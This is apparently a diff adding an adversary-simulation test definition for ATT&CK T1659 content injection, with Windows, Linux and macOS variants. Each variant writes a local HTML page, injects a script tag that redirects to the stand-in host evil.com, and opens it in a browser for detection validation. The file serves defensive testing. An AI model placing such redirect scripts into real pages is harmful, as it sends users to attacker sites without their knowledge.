@@ -1,0 +1,122 @@
+attack_technique: T1659
+display_name: Content Injection
+atomic_tests:
+  - name: Windows Content Injection Simulation (HTML/JS)
+    description: |
+      Simulates adversary-style content injection by inserting a malicious
+      script tag into a local HTML file. This models the post-injection
+      artifact of T1659 for detection validation.
+    supported_platforms:
+      - windows
+    input_arguments:
+      target_html:
+        description: The HTML file to be injected.
+        type: Path
+        default: '$env:TEMP\index.html'
+      url:
+        description: The URL for the injected script.
+        type: String
+        default: 'https://evil.com'
+    executor:
+      name: powershell
+      command: |
+        $html = @"
+        <html>
+        <head>
+        <title>Internal Portal</title>
+        </head>
+        <body>
+        <h1>Welcome</h1>
+        </body>
+        </html>
+        "@
+        $html | Out-File "#{target_html}" -Encoding utf8
+
+        Write-Host "--- Original Content ---" -ForegroundColor Cyan
+        Get-Content "#{target_html}"
+
+        $imgTag = @"
+        <script>window.location.href='#{url}';</script>
+        "@
+
+        $content = Get-Content "#{target_html}" -Raw
+        $newContent = $content -replace '<head>', "<head>`n$imgTag"
+        $newContent | Out-File "#{target_html}" -Encoding utf8
+
+        Write-Host "`n--- Injected Content ---" -ForegroundColor Red
+        Get-Content "#{target_html}"
+        Get-ChildItem "#{target_html}" | Where-Object Name -like 'index.html'
+        Start-Process "msedge.exe" "#{target_html}"
+      cleanup_command: |
+        if (-not (Get-ChildItem -Path $env:TEMP -ErrorAction SilentlyContinue | Where-Object Name -like 'index.html')) { Write-Host "[!] Artifact missing: $env:Temp\index.html File - [-] Please Run : Invoke-AtomicTest T1659"; exit 1 };
+        if (Test-Path "#{target_html}") {
+            Remove-Item "#{target_html}" -ErrorAction SilentlyContinue
+            Write-Host "Cleanup: Temporary HTML file removed." -ForegroundColor Green
+            Stop-Process -Name "msedge" -ErrorAction SilentlyContinue
+        }
+
+  - name: Linux Content Injection Simulation (HTML/JS)
+    description: |
+      Simulates adversary-style content injection by inserting a malicious
+      script tag into a local HTML file.
+    supported_platforms:
+      - linux
+    input_arguments:
+      target_html:
+        description: The HTML file to be injected.
+        type: Path
+        default: '/tmp'
+      url:
+        description: The URL for the injected script.
+        type: String
+        default: 'https://evil.com'  
+    executor:
+      name: sh
+      command: |
+        touch "#{target_html}/index.html"
+        printf "<html>\n<head>\n<title>Internal Portal</title>\n</head>\n<body>\n<h1>Welcome</h1>\n</body>\n</html>\n" > "#{target_html}"/index.html
+        echo "--- Original Content ---"
+        cat "#{target_html}"/index.html
+        sed -i "s|<head>|<head><script>window.location.href='#{url}';</script>|g" "#{target_html}"/index.html
+        echo "\n--- Injected Content ---"
+        cat "#{target_html}"/index.html
+        ls -l "#{target_html}"/index.html
+        xdg-open "#{target_html}"/index.html
+      cleanup_command: |
+        if [ -f "#{target_html}"/index.html ]; then echo "Successfully Created #{target_html}/index.html"; else echo "[!] Artifact Not Found, Rerun the Atomic Test Again - Invoke-AtomicTest T1659"; exit 0; fi
+        rm -f "#{target_html}"/index.html
+        echo "Cleanup: Temporary HTML file removed."
+        pkill -f "firefox|chrome|msedge|chromium" || echo "No browser process found to kill."
+        echo "Cleanup: Temporary HTML file removed and browser processes signaled to close."
+
+  - name: macOS Content Injection Simulation (HTML/JS)
+    description: |
+      Simulates adversary-style content injection by inserting a malicious
+      script tag into a local HTML file on macOS. This uses 'open' to trigger
+      the default browser for verification.
+    supported_platforms:
+      - macos
+    input_arguments:
+      target_html:
+        description: The HTML file to be injected.
+        type: Path
+        default: '/tmp'
+      url:
+        description: The JS payload for the injected script.
+        type: String
+        default: 'https://evil.com'
+    executor:
+      name: sh
+      command: |
+        touch "#{target_html}/index.html"
+        printf "<html>\n<head>\n<title>Internal Portal</title>\n</head>\n<body>\n<h1>Welcome</h1>\n</body>\n</html>\n" > "#{target_html}"/index.html
+        echo "--- Original Content ---"
+        cat "#{target_html}"/index.html
+        sed -i '' "s|<head>|<head><script>window.location.href='#{url}';</script>|g" "#{target_html}"/index.html
+        echo "\n--- Injected Content ---"
+        cat "#{target_html}"/index.html
+        ls -l "#{target_html}"/index.html
+        open -a "Safari" "#{target_html}"/index.html
+      cleanup_command: |
+        if [ -f "#{target_html}"/index.html ]; then rm -f "#{target_html}"/index.html & pkill -x "Safari" || echo "Safari not running."; echo "Cleanup: Temporary HTML file removed."; else echo "Cleanup: File not found, nothing to remove. [!] Please Rerun the test - Invoke-AtomicTest T1659"; exit 0; fi
+
